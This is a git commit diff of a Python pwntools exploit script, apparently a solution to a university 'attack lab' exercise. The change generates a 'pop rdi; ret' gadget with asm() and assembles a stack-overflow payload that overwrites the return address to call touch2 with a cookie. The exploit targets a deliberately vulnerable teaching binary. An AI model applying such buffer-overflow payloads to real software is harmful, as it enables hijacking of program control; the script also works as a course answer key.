6242ca1bf5b9c6df2fed08fdbc4e3726e34d7184
justapig9020 <justapig9020@gmail.com>
2022-04-13 15:09:49 +0800

    Update touch2 exploit with pwntools.asm

--- attack/attack/exp.py
+++ attack/attack/exp.py
@@ -3,6 +3,8 @@ from pwn import *
 def set_p64(addr):
     return p64(addr).decode("iso-8859-1")
 
+context.clear(arch="amd64")
+
 cookie = 0x59b997fa
 touch1 = 0x4017c0
 touch2 = 0x4017ec
@@ -30,10 +32,11 @@ input_buf_addr = 0x5561dc78
 
 # pop rdi
 # ret
-pop_rdi_ret = 0xc35f
-cmd_p64 = set_p64(pop_rdi_ret)
-junk = "a" * (junk_size - len(cmd_p64))
-payload = cmd_p64 + junk + set_p64(input_buf_addr) + set_p64(cookie) + set_p64(touch2)
+
+pop_rdi_ret = asm("""pop rdi
+                    ret""").decode("iso-8859-1")
+junk = "a" * (junk_size - len(pop_rdi_ret))
+payload = pop_rdi_ret + junk + set_p64(input_buf_addr) + set_p64(cookie) + set_p64(touch2)
 
 p.sendline(payload)
 print(str(p.recv(), "ascii"))
